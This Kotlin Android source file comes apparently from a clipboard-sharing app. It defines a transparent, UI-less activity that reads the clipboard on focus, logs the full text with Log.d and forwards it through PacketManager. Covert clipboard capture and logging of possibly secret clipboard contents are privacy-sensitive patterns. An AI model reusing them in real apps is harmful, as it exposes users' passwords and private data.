package com.local.passover.clipboard

import android.content.ClipboardManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import com.local.passover.classes.PacketManager

class ClipboardActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // no setContentView—this is fully transparent
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (!hasFocus) return

        val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        val clip = clipboard.primaryClip
        val text = clip
            ?.getItemAt(0)
            ?.coerceToText(this)
            ?.toString()
            ?: "<empty>"

        Log.d("ClipReaderAct", "📑 Clipboard now contains: “$text”")
        PacketManager.sendClipboard(text)
        finish()
    }
}